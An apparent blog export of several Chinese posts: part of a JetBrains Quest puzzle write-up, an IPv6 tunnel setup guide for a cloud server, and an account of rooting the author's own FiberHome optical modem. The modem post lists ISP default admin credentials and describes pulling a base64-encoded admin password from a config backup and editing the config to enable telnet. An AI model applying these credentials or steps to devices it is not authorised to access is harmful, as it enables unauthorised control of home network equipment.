经历过的那些有意思的东西。 到下面这里，点击按钮，会给它的邮箱发个邮件。 （mailto:jobs@jetbrains.com?subject=Fearless Quester - Any - any 然而发现并不是啦 23333. 然后再看回 To progress with your quest what you’ll need。 应该是与一个游戏开发有关，查了一下 Konami games. 日本最具影响力的游戏软件商之一，KONAMI（科乐美）。 可能是有个游戏啥的？ Step 7找了找 game develop，发现了一个这个网页。 然后找死找不到quest，难受死了。 在 Network 里找个半天也没找到嘤嘤嘤。 就在一脸懵逼的时候，想起来好像没有用 Chrome 的无痕模式（（ 后来发现是我的浏览器开了弹窗拦截，把找个也给误拦截了emmm。 再一搜，发现了相关的 js 文件。 Beat The Quest在block-breaker.js 这个文件里搜索quest，发现了第二个 quest 的 code ↓。 （可能这个也是非预期解了23333 \"\\n |\\n |\\n | Congratulations you have beat the second quest.\\n | Use the code key GamesAreFun on the\\n | quest page https://jb.gg/quest to claim your prize.\\n | \\n \" 所以 Code 就是 GamesAreFun 啦~ 拿着它去 https://jb.gg/quest 换新的授权吧嘻嘻嘻。 发现也是跳转到之前的那个页面（ https://www.jetbrains.com/promo/quest/ ）。 同样输入邮箱和 Code 就好了。 又得到3个月的免费授权！上面说了可以叠加使用。 You have passed the second quest and have proven yourself a worthy contender for our devious puzzles. We have one last quest in this series for you. It will be the ultimate quest, and it will secure your place in the halls of JetBrains Quest legend. A little @jetbrains bird will deliver the next clue – so do some birdwatching, 噫！还有一个终极的 quest 等着大家呢！ 猜一猜是不是六个月的授权，然后凑成一整年呢哈哈哈哈哈。 然后在邮件结尾又发现了 Leet，就是 Step5 中提到的那个黑客语。这才发现原来 Quest1 的邮件中也有。 可能这也算是一个暗示/hint 吧！ Y0U H4V3 R3C13V3D 7H15 3M41L B3C4U53 Y0U H4V3 P4RT1C1P4T3D 1N J3TBR41N5 QU35T 这里还可以取消邮件订阅啥的，应该还算挺友好的吧。 Step7 中 game dev 页面的游戏解法再回去看一下这个游戏到底啥回事。结合再上一步中的提示。 To progress with your quest what you’ll need: To check out what we have for game developers. Be geeky enough to remember how you used to cheat at Konami games. Try cheating on the page. 看了一下别人的讨论，才大概明白这个的意思。 他是想让你用在 Konami games 里积累的技巧来唤出游戏界面，然后尝试完成游戏，或者尝试在网页中作弊完成（可能是上面的非预期解吧）。 根据别人的说法，在网页里通过依次按下键盘上的 上上下下左右左右BA 这几个键，就能唤出游戏界面了！ 原来就是个弹球游戏啊 23333. 而且球掉了还可以继续玩。 看了一下是通过一个 canvas 来实现的。 把条块消除得差不多就看到 code key 啦！ 小结感觉 JetBrains 的这两个 Quest 难度还好，还是挺友好的。 于是就白嫖了总共六个月的 JB 全家产品免费授权。 （不过之前就有教育邮箱的免费授权呢 所以通过这个 Quest，让我们更深入地了解了 JB？说不定还能顺便招聘？ （这大概是其本意吧？（盲猜 注意一下上面的内容仅供学习研究，转载的话记得留下本文链接呢。 欢迎一起交流嘻嘻嘻。 （溜了溜了","path":"2020/03/12/CTF_2020JetBrainsQuest/"},{"title":"利用TunnelBroker给阿里云ECS配置公网IPv6","text":"0x00 前言目前 IPv6 用得挺广了吧，很多应用都支持 IPv6 了，三大运营商基本都支持了，联通的流量自带 IPv6，而且开热点的话还支持下发给其他设备。 不过其实很多服务器都没上 IPv6，比如阿里云的 ECS 一般公网只有 IPv4 地址（想拥有一个 IPv6 地址还得再花钱）。 于是最近就折腾了一下，利用 Hurricane Electric 提供的免费 IPv6 Tunnel Broker，让阿里云的 ECS 拥有了 IPv6 地址（非原生），理论上大部分服务器都适用的。 这里用到的是 IPv6 Tunnel，基于 protocol-41 (6in4)，其实是把 IPv6 包通过 IPv4 包来传输，相当于建立在网络层上的代理，需要你的服务器的操作系统支持，而且要有一个相对固定的公网 IPv4 地址。 When using 6to4, you do not transmit IPv6 packets. Instead, special IPv4 packets are wrapped around IPv6 payloads. These packets have IPv4 protocol 41, as defined by RFC 2473. 当然，性能的话肯定比不上原生的 IPv6 了，不过自己玩玩还好，问题不大吧。 0x01 申请 IPv6 Tunnel Broker前往 https://tunnelbroker.net，注册一个你自己的账号。 登录之后，点击左侧的 Create Regular Tunnel。 一个账号最多可以创建5条tunnel。 IPv4 Endpoint 里填服务器的公网地址，输入后会自动检查是否支持。 You are viewing from 显示的是你访问网站的公网 IPv4 地址，如果是在服务器上访问的话 Endpoint 就是这个了。 注意：服务器要允许来自 HE 的 ICMP 请求，也就是说不能禁止来自 HE 的 ping。 （这里借一张网上的图，比如下面这样的↓ Available Tunnel Servers 里选择离你服务器较近的，可以在服务器上ping试一试。 现在显示 Los Angeles, CA, US Not Available (Full)，洛杉矶的都满了233. Asia 有 HK、SG、JP 这三个节点，不过据网上说貌似速度也不怎么样了，具体自己看看吧。 选择好之后就点击创建隧道就申请好了。 这里的 Client IPv4 Address 是你之前填的地址，点击可以进行修改， Client IPv6 Address 就是你服务器的公网IPv6地址了，如果需要DNS解析的话就给这个地址加个 AAAA 解析就行（注意不需要加上/64）。 这里的 Routed IPv6 Prefixes 是该隧道可用于分配的 IPv6 地址段，可为内网机器都分配上唯一的 IPv6 地址。 可见分配的是 /64，即 IPv6 地址的前缀长度为64位。后（128-64=）64位为网络接口ID（可理解为设备在网络上的唯一ID），因此你有2^64（1844亿亿）个可用的IP地址了。😉 当然你还可以申请一个/48前缀的路由，这样可用的地址更多了。（2^80个） 0x02 阿里云 ECS 开启 IPv6阿里云的硬盘镜像默认是把 IPv6 给关掉的，这里就手动打开好了。 vim /etc/sysctl.conf 在文件末尾的位置把ipv6设置中的1改成0，变成类似如下的亚子。 net.ipv6.conf.all.disable_ipv6 = 0 net.ipv6.conf.default.disable_ipv6 = 0 net.ipv6.conf.lo.disable_ipv6 = 0 net.ipv6.conf.eth0.disable_ipv6 = 0 而后重新载入配置。 sysctl -p 然后使用ifconfig看一看，就会发现支持 IPv6 了。 比如下面这个，有了inet6这一项。 eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500 inet 172.xxx.xxx.xxx netmask 255.255.240.0 broadcast 172.xxx.xxx.xxx inet6 fe80::xxxx:xxxx:xxxx:xxxx prefixlen 64 scopeid 0x20&lt;link&gt; ether 00:16:xx:xx:xx:xx txqueuelen 1000 (以太网) RX packets 1688753 bytes 328028654 (328.0 MB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 1837158 bytes 637871915 (637.8 MB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 0x03 给 ECS 配置 IPv6 隧道在Example Configuration 里有很多示例。 比如Ubuntu的。 vim /etc/network/interfaces auto he-ipv6 iface he-ipv6 inet6 v4tunnel address 2001:470:xxxx:xxxx::2 netmask 64 endpoint 216.218.xxx.xxx local 172.16.xxx.xxx ttl 255 gateway 2001:470:xxxx:xxxx::1 将上面的配置粘贴到文件的最后。 注意一下，内网环境要用内网的IP！他这里也写清楚了的。 NOTE: When behind a firewall appliance that passes protocol 41, use the IPv4 address you get from your appliance’s DHCP service instead of the IPv4 endpoint you provided to our broker. 注意： 阿里云的 ECS 要将local中的IP修改为内网的IP，即私网IP地址，例如172.16.xxx.xxx，而不是公网IP！！！ 不清楚的话还可以参考Ubuntu的Wiki，戳这里。 而后让IPv6生效。 ifup he-ipv6 再看一下 ifconfig，这时应该有一个 he-ipv6的了！类似这样的。 he-ipv6: flags=209&lt;UP,POINTOPOINT,RUNNING,NOARP&gt; mtu 1480 inet6 2001:470:xxxx:xxxx::2 prefixlen 64 scopeid 0x0&lt;global&gt; inet6 fe80::xxxx:xxxx prefixlen 64 scopeid 0x20&lt;link&gt; sit txqueuelen 1000 (IPv6-in-IPv4) RX packets 11605 bytes 3127821 (3.1 MB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 13811 bytes 2403522 (2.4 MB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 P.S.: 如果想让隧道失效（没有删除的话重启后还是会自动启用）： ifdown he-ipv6 如果想删除隧道： ip tunnel del he-ipv6 如果已经生效了会提示：ifup: interface he-ipv6 already configured。 如果设置出错了，或者想修改配置，需要先删除隧道，再重新生效就好。 现在就来测试一下吧！ root@miaoTony:~# ping6 -c 5 ipv6.google.com PING ipv6.google.com(tsa03s02-in-x0e.1e100.net (2404:6800:4008:803::200e)) 56 data bytes 64 bytes from tsa03s02-in-x0e.1e100.net (2404:6800:4008:803::200e): icmp_seq=1 ttl=53 time=393 ms 64 bytes from tsa03s02-in-x0e.1e100.net (2404:6800:4008:803::200e): icmp_seq=2 ttl=53 time=390 ms 64 bytes from tsa03s02-in-x0e.1e100.net (2404:6800:4008:803::200e): icmp_seq=3 ttl=53 time=390 ms 64 bytes from tsa03s02-in-x0e.1e100.net (2404:6800:4008:803::200e): icmp_seq=4 ttl=53 time=393 ms 64 bytes from tsa03s02-in-x0e.1e100.net (2404:6800:4008:803::200e): icmp_seq=5 ttl=53 time=388 ms --- ipv6.google.com ping statistics --- 5 packets transmitted, 5 received, 0% packet loss, time 4003ms rtt min/avg/max/mdev = 388.107/391.132/393.213/1.914 ms 当然也可以 ping6 ipv6.baidu.com。 如果不成功可以重启系统试试。 当然，你也可以尝试在命令行中进行配置（略）。 Windows 10 下的配置，在 cmd 中执行下面的命令。 netsh interface teredo set state disabled netsh interface ipv6 add v6v4tunnel interface=IP6Tunnel localaddress=172.16.xxx.xxx remoteaddress=216.218.xxx.xxx netsh interface ipv6 add address interface=IP6Tunnel address=2001:470:xx:xxxx::2 netsh interface ipv6 add route prefix=::/0 interface=IP6Tunnel nexthop=2001:470:xx:xxxx::1 注意修改对应的IP地址。 0x04 一些问题的解决按照上面一番配置好之后，有可能还是访问不了 IPv6 的网站。 有可能需要如下处理吧。（谁知道会这么麻烦呢 要是没事了就直接往下看了。 需要放行服务器的41端口。毕竟流量是通过IPv4传输的啦。 例如： ufw allow 41 或者 iptables -t filter -I INPUT -p 41 -j ACCEPT iptables -t filter -I OUTPUT -p 41 -j ACCEPT 同时要记得在（阿里云的）安全组里放行。 配置好 IPv6 的 DNS vim /etc/resolv.conf 在最后添加谷歌的DNS服务器 nameserver 2001:4860:4860::8888 nameserver 2001:4860:4860::8844 或者国内的公共DNS：240c::6666 或 240c::6644 添加路由 route -A inet6 add ::/0 dev he-ipv6 再 ping 一下应该可以了吧（ 不行再重启试试（重启解决绝大部分问题呢 0x05 Nginx 支持 IPv6 访问修改配置文件，监听 IPv6 端口。 server { listen 80; listen [::]:80; // 监听 IPv6 的 80 端口 # ... } server { listen 443 ssl http2; listen [::]:443 ssl http2; // 监听 IPv6 的 443 端口 # ... } 然而，发现一个情况，只有当服务器访问IPv6的网站的时候，或者说有 IPv6 流量的时候，外网才能通过这个公网的IPv6地址访问到服务器emmm。（懵 于是加一个 cron 计划，定时ping一下好了。 crontab -e 添加一个计划。 */1 * * * * ping6 -c 1 he.net 重启 cron 使其生效。 systemctl restart cron 每分钟执行一次 ping 操作，这样访问就没问题了。 （不过想不大明白为啥这个通道会自动断开。有人说与 ip6tables 有关，不大清楚。。 emmm 0x06 配置 DNS配置一条AAAA记录指向公网的 IPv6 地址即可。可以试试开启CDN。 而后就可以通过域名访问网站了。 不过没有 CDN 的话只能通过 IPv6 进行访问。 0x07 检查网站是否支持 IPv6利用 http://ipv6-test.com/validate.php 0x08 自动更新 Endpoint IP前面说只要公网的IPv4地址相对固定就好了，这里就这个意思啦。 HE 还支持为动态 IPv4 地址建立 IPv6 通道，这里要用到他提供的API了。 We’ve added support for Dyn-compliant endpoint updates so that equipment talking this spec can very easily update your tunnel endpoint. Update URL: https://ipv4.tunnelbroker.net/nic/update (ipv4 is important here, don’t remove it)Username: Your Tunnelbroker.net usernamePassword: Tunnel specific authentication key (under Advanced on the tunnel information page) if one is set, otherwise your Tunnelbroker.net password.Hostname: Numeric tunnel ID Numeric tunnel ID in “tunnel#.tunnelbroker.net” (This host does not actually exist) Tunnel reverse host, aka “user-#.tunnel.tserv#.loc#.ipv6.he.net” 或者也可以访问更新的URL。 就可以在服务器上写个脚本检查公网地址有没有更新就好了。 自动更新IPv4地址： To auto-detect your IPv4 address: https://&lt;USERNAME&gt;:&lt;PASSWORD&gt;@ipv4.tunnelbroker.net/nic/update?hostname=&lt;TUNNEL_ID&gt; https://ipv4.tunnelbroker.net/nic/update?username=&lt;USERNAME&gt;&amp;password=&lt;PASSWORD&gt;&amp;hostname=&lt;TUNNEL_ID&gt; 手动指定更新的IPv4地址： To manually specific your IPv4 address: https://&lt;USERNAME&gt;:&lt;PASSWORD&gt;@ipv4.tunnelbroker.net/nic/update?hostname=&lt;TUNNEL_ID&gt;&amp;myip=&lt;IP ADDRESS&gt; https://ipv4.tunnelbroker.net/nic/update?username=&lt;USERNAME&gt;&amp;password=&lt;PASSWORD&gt;&amp;hostname=&lt;TUNNEL_ID&gt;&amp;myip=&lt;IP ADDRESS&gt; 当然不想看的话就看完整版： **TL;DR:**（Too long; Don't read/ Too long; Didn't read） http[s]://[TB_USER:TB_PASS@]tunnelbroker.net/nic/update?[username=TB_USER&amp;password=TB_PASS&amp;]hostname=&lt;TUNNEL_ID|tunnelTUNNEL_ID.tunnelbroker.net|TB_USER-TUNNEL_LABEL.tserv#.LOC#.ipv6.he.net&gt;[&amp;myip=IPV4] 后面可以试一试这个功能 hhhh 当然了，HE还自带了 DNS 解析，可以尝试一下呢。 下面还有一些关于 IPv6 的拓展的链接。 好了就这样吧。 （溜了溜了 Reference &amp; Extensive Reading记一次给线上服务器添加IPv6支持的步骤 He.net DNS域名解析申请使用-免费DDNS、IPv6 地址和Slave DNS 申请 HE.NET IPv6 隧道以使主机支持 IPv6 Servarica IPv6 Only VPS折腾体验 如何给阿里云ecs开启ipv6访问 阿里云centos6.8开启ipv6通过appstore审核的方法 阿里云服务器以及CDN支持IPV6的方法 Dyn-compliant Endpoint Updates etc.","path":"2020/03/03/Server_ObtainIPv6ViaTunnelBroker/"},{"title":"光猫折腾记 | 获取超级管理员密码&开启telnet&IPv6&桥接宽带","text":"0x00 前言最近觉得家里的网速有点慢，上着网课或者看着视频，WiFi 连接的设备同时在用的话就开始卡了 emmm就很难受。🙁 然后又听说三大运营商的宽带差不多都分配 IPv6 了，手机的话联通流量分配 IPv6 地址也有一段时间了，开热点还能下发 IPv6 到其他设备（然鹅我这里的移动好像还没有）。 于是就想折腾一下家里的光猫/路由器，反正就是瞎折腾吧。 这个光猫是有点年纪的 HG260GS-U，烽火家的。 硬件版本 BCM.V2.0 ，软件版本 G00Y1.00M0001 。 大概的内容就是—— 获取了超级管理员密码，开启了 Telnet 管理，启用了 IPv6，并尝试了宽带桥接的改造等等。 0x01 获取超级管理员密码通过光猫的管理地址连接到管理页面，一般是 192.168.1.1。登录界面如下。 光猫背面有一个 user 用户的信息，登录之后的界面功能贼少，只能看一下连接状态，设置一下WIFI、静态路由之类的基础配置，连宽带连接都设置不了。 于是想到通过超级管理员进行登录。 在网上搜了各种通用密码，比如用户名、密码分别为 CUAdmin CUAdmin telecomadmin nE7jA%5m CMCCadmin aDm8H%MdA fiberhomehg2x0 hg2x0 （工程账号） 有可能登录是这个网址：http://192.168.1.1/cu.html 然而都没有用！ 哦对了，这个工程账号（据说是隐藏用户）这样开启： 访问 http://192.168.1.1/logoffaccount.html ，将隐藏用户设置为启用，而后点击保存/应用即可。 （然而我这里没用 于是看了看网上大佬们的骚操作，发现可以通过备份设置的办法获取到超级管理员账号及密码。 Step 1 以普通用户身份登录光猫就是光猫背后的那个用户名密码啦。 Step 2 下载设置备份文件访问 http://192.168.1.1/backupsettings.conf ，下载配置文件backupsettings.conf。 注意一定要在登陆后才下载，否则下载得到的文件并没有配置信息，而是一个让你登录界面的 HTML 文件。 正确的文件是一个xml文本，例如下面这样的。 可以发现里面保存了所有的配置信息，WAN连接、LAN连接、WiFi及WPS、宽带信息、Loid等等都有，当然，超级用户信息也在。 而且这个文件没有（明显的）加密，最多只是用了个base64。 超级管理员用户就在DeviceInfo下的X_CMCC_TeleComAccount里。 用户名为admin，密码通过base64解码可以得到为Cmcc10086#。 （By the way，user用户的密码在这里啦↓ Step3 登录试试成功登录，界面比user功能多得多了，可以配置宽带信息、VLAN、USB存储远程下载等等了。 0x02 开启 Telnet 管理按理说是可以利用工程账号进去开启 Telnet 的，然而我也不知道为啥进不去emmm 找个网上的图↓ 那就**直接改配置文件好吧 **233333 Step 1 修改配置文件首先备份一份上面下载的配置文件（改错了还可以恢复嘛），而后搜索telnet，把它设为TRUE。 注意大小写呀！ 当然如果想要开启 FTP 的话可以顺便开启一下hhh。 Step 2 上传配置文件访问更新路由器配置的页面 http://192.168.1.1/updatesettings.html （可能需要登录） 选择修改后的配置文件，点击 更新配置。 Step 3 重启光猫（如果没有自动重启的话 可以选择在 管理-设备管理-设备重启 里重启，当然也可以直接关掉电源再打开233。怎么喜欢怎么来。 Step4 telnet 连接光猫而后就可以通过 telnet 连接到你的光猫了。 用户名和密码都是admin。 它用的是 BCM96838 这个芯片。（感兴趣可以搜一搜 发现它并没有 cd 这个command。 &gt; help ? help logout exit quit reboot brctl cat virtualserver ddns df loglevel logdest dumpcfg dumpmdm dumpeid mdm meminfo psp kill dumpsysinfo dnsproxy syslog echo ifconfig ping ps pwd sntp sysinfo tftp wlctl showOmciStats laser omci omcipm dumpOmciVoice dumpOmciEnet dumpOmciGem laser arp defaultgateway dhcpserver dns lan lanhosts passwd ppp restoredefault route save swversion uptime cfgupdate swupdate exitOnIdle wan set get gendefsettings loaddefsettings checkdefsettings composenewsettings create_merge_presetting transform_presetting upgrade ledctl usbtest ls facmode simcard voipteststart voiptestend voice_test phone_connect recordpcmstart recordpcmend StartCall StopCall StartRing StopRing PlayCNGTone StopCNGTone PlayDTMFTone fhvoice redirect mcpctl itms wifi card 不过好像功能也不少的亚子。 看了一下存储。 内存。 然后发现有一个隐藏的sh指令，可以支持大部分的 Linux 指令啦~ 看了一下系统信息。 # uname -a Linux (none) 3.4.11-rt19 #3 SMP PREEMPT Mon Jul 4 19:17:02 CST 2016 mips GNU/Linux webs 目录下为所有的前端网页的文件。 FHFactoryCheck.html ipsec.html FH_Simple_CloseHideWeb.html ipsecview.html FH_Simple_FactoryRestore.html ipv6lancfg.html FH_Simple_OpenHideWeb.html itms_right.html StaticIpAdd.html itms_wrong.html StaticIpErr.html itmsuploadfinish.html areacode.js itmsuploadfinish_guangdong.html backupsettings.html itmsuploadingimage.html buildinfo.html itmsuploadingimage_guangdong.html certadd.html itmsuploadreboot.html certcaimport.html jquery.js certcaview.html lanvlancfg.html certimport.html lockerror.html certloadsigned.html logconfig.html certlocalview.html login.html certreqshow.html loginerror.html certshow.html logintro.html cfgepon.html logo.html cfgeth.html logoffaccount.html cfggpon.html logout.html codepassword.html logview.html colors.css macstudy.html ctExternalApInfo_user.html main.html ctExternalApInfooffline.html mainCT.html ctStaticIpAdd.html menuCT.js ctTracerouteresult.html menuTitle.js ctalgcfg.html menuTree.js ctdhcpcfg.html multicast.html ctdhcpdevice.html password.html ctdiag.html pic ctdiag_ping.html platconfig.html ctdiag_tracert.html portName.js ctdiagmng.html portalmngr.html ctdiagsystem.html portmap.html ctdiagxPon.html portmapadd.html ctdms.html portmapedit.html ctdnsconfig.html pradd.html cteponinterfaceinfo.html prmngr.html ctexternalApInfo.html pswdadmin.html ctgponinterfaceinfo.html pswduser.html ctigmpproxy.html qoscls.html ctigmpsnooping.html qosclsedit.html ctinfo.html qosclsview.html ctinfo_fujian.html qosqmgmt.html ctipflt.html qosqueue.html ctipfltblack.html qosqueueadd.html ctipfltwhite.html qosview.html ctlanbind.html rebootinfo.html ctlogconfig.html redirect.html ctlogflashview.html redirect_cardoffline.html ctlogintro.html redirect_portal.html ctlogview.html redirect_portal_confirm.html ctloid.html redirect_uploadimage.html ctmacflt.html register.html ctmacpolicy.html register_anhui.html ctmldproxy.html register_fail.html ctmldsnooping.html register_fujian.html ctmulticastvlan.html register_guangdong.html ctpingresult.html register_guangdong_fail.html ctpswdrelogin.html register_hainan.html ctroute6add.html register_ing.html ctstatslan.html register_ing_anhui.html ctstatslan_user.html register_ing_card.html ctusererror.html register_ing_fujian.html ctuserpswd.html register_ing_guangdong.html ctwan_ethinfo.html register_ing_guangdong_1.html ctwanconfig.html register_ing_guangdong_refresh.html ctwanconfig_user.html register_ing_hainan.html ctwaninfo.html register_ing_iframe.html ctwaninfo6.html register_ing_iframe_refresh.html ctwaninfo6_user.html register_ing_iframe_refresh_1.html ctwaninfo_user.html register_ing_sichuan.html ctwaninfoall.html register_limit.html ctwaninfoallv6.html register_loid.html ctwlanInfo.html register_restore.html ctwlanInfo_user.html register_restore_remote.html ctwlcfg.html register_restore_retry.html ctwlsecurity.html register_restore_retry_sichuan.html ddnsadd.html register_restore_sichuan.html defaultsettings.html register_restoreinfo.html dhcpinfo.html register_sichuan.html diaginform.html registered_chongqing.html dnscfg.html registered_fujian.html dnsproxycfg.html registered_guangdong.html dosprotect.html registered_hunan.html downloadFile.html resetrouter.html enableipv6.html restoreinfo.html engdebug.html restoresettings.html eponadderr.html restrain.html epondelerr.html ripcfg.html ethadderr.html routeadd.html ethdelerr.html routetbl.html exporting.js rtdefaultcfg.html externalapcfg.html rtdefaultcfgerr.html externalapcfgoffline.html rtroutecfg.html externalapsecurity.html scdmz.html externalapsecurityoffline.html scinflt.html factorymode.html scinfltview.html fbctwanconfig.html scmacflt.html fhvoiceh248dsp.html scmacfltview.html fhvoiceh248mgc.html scmacpolicy.html fhvoiceh248ngn.html scoutflt.html fhvoiceh248port.html scoutfltview.html fhvoiceprotocol.html scvrtsrv.html fhvoicesettings.html servmngr.html fhvoicesipadvance.html simcardoffline.html fhvoicesipbasic.html sipregstatus.html fhvoicesipdigitmap.html sipteleview.html fhvoicesipfax.html sntpcfg.html fhvoicesipuserline.html speed.html firewall.html statsifc.html footer.html statsifcreset.html ftpcfg.html statswan.html gponadderr.html statswanreset.html gpondelerr.html storageusraccadd.html help_manage_device.html stylemain.css help_manage_file.html stylesCT.css help_manage_keep.html surprise.html help_manage_user.html todadd.html help_net_QOS.html todmngrview.html help_net_WLAN.html tr69cfg.html help_net_dhcp.html tr69cfgview.html help_net_externalap.html tr69connect.html help_net_network.html traffictl.html help_net_remote.html traffictladd.html help_net_route.html updatesettings.html help_net_time.html upload.html help_net_voice.html upload_chongqing.html help_net_voip.html uploadinfo.html help_safe_firewall.html upnpcfg.html help_safe_mac.html url_add.html help_safe_port.html urlfilter.html help_safe_wan.html urlfilterErr.html help_status_device.html usbbackup.html help_status_net.html usbbackuphandle.html help_status_remote.html usbbackupresult.html help_status_user.html usbinfo.html help_status_voip.html usbxdown.html help_use_IGMP.html util.js help_use_MLD.html wlcfg.html help_use_UPNP.html wlcfg_jiangsu.html help_use_VOIP.html wlcfg_zhejiang.html help_use_device.html wlcfg_zhejiang_user.html help_use_dns.html wlcfgadv.html help_use_nat.html wlrefresh.html help_use_usual.html wlsecurity.html highcharts.js wlsecurity_jiangsu.html hlpethconn.html wlsecurity_zhejiang.html hlpwlconn.html wlsecurity_zhejiang_user.html index.html wlshared.html ipsconfig.html wlwapias.html 然后还可以发现之前的配置文件在 /fhconf/backpresettings.conf。 日志文件在/fhlog/messages 。 /rom/etc/wlan 目录下好像有一些网卡芯片的驱动（？ 然后在某个目录下找到了各种默认配置文件emmm 其他的后面再慢慢玩吧（ 还有提醒一下，telnet 不用的话最好还是关掉吧，防止别人连上光猫改了你的配置就不好了呢。 0x03 再看光猫参数 &amp; 测速光猫参数上网搜了一下这个光猫的参数。（可能有所区别） 烽火HG260GS-U 产品特点 支持GPON接口，4FE+2POTS，LAN1口=1G LAN 2.3.4口=100M 支持路由/桥混合转发。 支持VLAN连接。 提供2.4GHz 802.11b/g/n无线接入功能，最高速率可达270Mbps，覆盖范围30m~100m。 支持SIP/MGCP/H.248等VOIP协议语音，支持多种语音编码器。 强大的QoS能力，保障多业务环境下的VoIP、IPTV等关键业务的服务质量。 支持TR-069远程管理：设备配置、版本升级、诊断等。 支持WPS。 支持Web方式，用户本地管理功能。 支持多SSID，提供多个虚拟无线网络。 支持VPN穿越 ，基于IPSec/L2TP。 支持IPv4/v6,TCP/UDP协议，支持IPv6开启DS-lite和双栈功能。 芯片集成度高，功耗小，性能稳定。 哇呜，它是支持千兆的啊！ 不过只有1口支持1Gbps，其他都是100Mbps的emmm 于是直接用网线连接光猫测了一下，果然是这样。 之前都没注意这个问题唉！是不是因为这个问题影响了网速啊啊啊啊嘤嘤嘤。（其实我也不知道我家宽带有多少带宽） 来测个速看看好了。 测速这是 连接 WiFi 的测速结果↓。 通过网线直连到除1口外的任意一个 LAN 口，再次测速。 差不多跑满100Mbps的带宽了。 那再来看看 LAN1 的千兆口吧。 ？？？ 你在逗我嘛？！哇呜原来有差不多150Mbps的啊！ 原来受限于 LAN 口的带宽啊！ 气死我了，连接WiFi的话只有差不多1/3的速度啊，草（一种植物）。 然后把之前连在光猫后的无线路由器接到了 LAN1 口，再登上路由器一看，原来它也只支持百兆带宽emmm 不过怎么说好呢，毕竟这光猫和路由器都有些年纪了，那时候千兆还没普及呢，可能用的才是10M/50M最多也不超过100M的宽带呢。 所以光猫有一个千兆口也很不错了呢233333.（摊手.gif 网线的讲究噢对了，还有一个好玩的事。。。 要用上千兆以太网，不仅需要光猫、路由器支持，还要你自己的设备支持，如果有线连接的话网线还至少要超五类线。 但是还要注意距离限制，超过一定的距离（如100m）也不行了，类别越高传输的频率越高则允许的距离就越小。（啊大佬你用光纤？打扰了。 我用网线连接的时候，最开始用的是一根比较老的 CAT-5e（超五类）线，可能是端口接触不大好或者线路老化的原因吧，实际网卡只协商到了100Mbps。换了一根新的网线（好像也是CAT-5e）就有1Gbps了。 然而，这根网线不够长，我用连接器把两根都能通千兆的网线连一起再连到电脑，这时网口又协商到100Mbps了emmm 看来这个网线抗干扰能力不大行呀，千兆网的有线传输要求还是挺严格的。 不过现在用的基本就六类线以上了吧，买网线还有装修布线什么的时候要注意一下这个问题。 还有买网线不要买扁的那种，剖面圆形那种就好。（感觉算是传输线理论？ 0x04 启用 IPv6前面看光猫的参数，发现支持 IPv6 唉！ 听说三大运营商的宽带基本部署 IPv6 了，不过估计设置里没开启，本地也没有分配公网地址，这次就来折腾一下吧。 先说一下，我自己对IPv6这一块都不大了解，这也是第一次尝试设置这个。 包括前缀分配什么的我都不清楚，所以这里的说法有可能存在错误，大佬们看到的话欢迎和我交流呀！ Step 1 以超级管理员身份登录光猫用上面获取的用户名密码登录。 在设置前，查看状态-网络侧信息-IPv6 连接信息，应该是空的。而 IPv4 连接信息里有一个连接的描述里是带有INTERNET的。 （假装这里有截图） Step 2 获取当前设置的参数首先在连接名称里选择带有INTERNET的选项，然后把这一页截个图或者拍照备份一下。（重要） 最好也备份一下设置文件（同 0x01）！ 这里面的VLAN ID、MTU是后面的依据。 Step 3 新建宽带连接这里前提是知道宽带的密码，如果不知道的话，可以在 0x01 中获取到的备份文件里找到嘿嘿嘿（仅做了base64加密）。 新建一个WAN连接，模式选择Route（路由），协议模式选择IPv4 &amp; IPv6（这就是目的所在喵！）。 选PPPoE，MTU里填上一步骤的参数；勾选启用Vlan，Vlan ID填上一步参数。 IPv6地址分配机制的话，我这里自动获取和DHCPv6都行，不过建议选自动获取吧。。。（不大清楚 获取前缀勾上吧，好像可以靠这个下发IPv6.（？ 服务模式选择INTERNET。 绑定端口就是你想要通过这个WAN进行连接网络的端口，如果不清楚的话全勾上就行了。如果有IPTV的话注意不要勾对应的端口。当然有其他需求的自己再考虑。它这里注明了的。 注: WAN连接之间不能共享绑定端口，最后绑定端口的WAN连接绑定操作将冲掉之前其它WAN连接对该端口的绑定操作！ 大概的界面类似于这样的。不同设备大同小异的啦。 而后点击保存/应用。 Step 4 IPv6 DHCP 配置（这一块其实我也不大清楚emmm 大概是这样吧 貌似DHCPv6是私网，Radvd是利用获取的前缀下发公网的地址。 网上大概这么说的↓。 在IPV6的自动配置中，分为两种技术一种是传统的有状态(stateful),典型代表就是与IPv4时代相对应的DHCPv6，一种是IPv6的无状态(stateless)自动配置，典型代表是Radvd。这是IPv6协议的一个突出特点:支持网络节点的地址自动配置。 在无状态地址自动配置方式下，网络接口接收路由器宣告的全局地址前缀，再结合接口ID得到一个可聚集全局单播地址。在有状态地址自动配置的方式下，主要采用动态主机配置协议（DHCP），需要配备专门的DHCP服务器，网络接口通过客户机/服务器模式从DHCP服务器处得到地址配置信息。 具体来说，以RADVD为代表的无状态自动配置不需要消耗很多机器资源，也不像传统DHCP一样需要维护一个本地数据库来维护地址分配状态，他只是进行广播前缀地址，客户端收到这种广播后再自己使用EUI64算法生成全球唯一的IPv6地址，进行自我配置。 还有 &lt;1&gt;radvd用于无状态自动配置地址，客户端通过网络接口接收路由器宣告的全局地址前缀，再结合接口ID形成全球单播地址，但是这种配置不能获取DNS。 &lt;2&gt;dhcpv6用于有状态自动配置地址，类似于ipv4的dhcp，客户端从服务器的地址池中配置地址，可获取到DNS。 （然后应该还要配置一下 IPv6 DNS Proxy，这个我也不大清楚emmm Step 5 确认连接状态返回到状态-网络侧信息，分别看看IPv4和v6的连接信息。留意协议中带有IPv4&amp;IPv6的状态。 刚开始可能连不上，过一段时间就连上了。 如果还连不上的话，将之前带有 INTERNET 的那个WAN连接给禁用或删除就好了。 （不过如果有个TR069那个运营商配置下发的就自己看着办了，删了可以不受运营商进行配置下发和上报，有影响的话新建一个或者修改上一步的服务模式就好了。 到这里我惊喜地发现，貌似账号支持多播唉！不过这个光猫里自然不支持多播叠加的了。可以使用桥接宽带让后面的路由器做处理啦。（后面再说） 于是尝试了一下成功连了两个，其中绑定端口设置成不一样的。不过不知道最多可以几播hhh。 连接光猫是可以下发 IPv6 公网地址的。 然后发现那个外接的无线路由器也不支持 IPv6，气死了（后面换一个 